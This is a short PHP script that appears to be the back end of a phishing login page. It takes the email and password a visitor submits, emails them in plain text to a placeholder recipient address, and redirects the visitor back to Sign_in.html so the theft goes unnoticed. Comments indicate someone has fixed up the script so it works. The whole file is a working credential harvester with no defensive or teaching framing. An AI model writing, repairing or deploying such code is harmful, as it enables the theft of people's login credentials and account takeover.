<?php
// Added quotes around POST array keys
$username = $_POST['email']; 
$password = $_POST['password']; 

$to = "recipient@example.com"; 
$subject = "Login Details"; 
$message = "Username: $username ||| Password: $password"; 
$headers = "From: sender@yourdomain.com"; 

if (mail($to, $subject, $message, $headers)) { 
    header("Location: Sign_in.html"); 
    exit; // Added exit to stop script execution
} else { 
    header("Location: Sign_in.html"); 
    exit; // Added exit to stop script execution
} 
?>

